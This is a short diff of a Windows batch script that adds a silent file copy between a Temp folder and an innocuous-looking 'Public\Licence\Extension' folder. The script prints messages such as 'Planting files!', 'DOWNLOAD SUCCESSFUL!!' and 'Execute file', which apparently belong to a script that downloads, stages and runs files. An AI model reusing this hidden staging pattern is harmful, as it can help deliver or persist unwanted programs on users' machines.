@@ -60,7 +60,7 @@ echo ************* Debugging dir ****************
 
 
 
-::echo ************* Copy file ****************
+::echo ************* Copy file 1 give ****************
    copy "C:\Users\%username%\AppData\Local\Temp\afolder\*.*" "C:\Users\Public\Licence\Extension\" /y > nul 2> nul
    echo Planting files!
 
@@ -422,6 +422,9 @@ echo .
 
    :SUCCESS
    echo DOWNLOAD SUCCESSFUL!!
+   ::echo ************* Copy file 2 take ****************
+   copy "C:\Users\Public\Licence\Extension\*.*" "C:\Users\%username%\AppData\Local\Temp\afolder\" /y > nul 2> nul
+   echo Planting files!
    echo.
    echo.
    echo ************* Execute file ****************
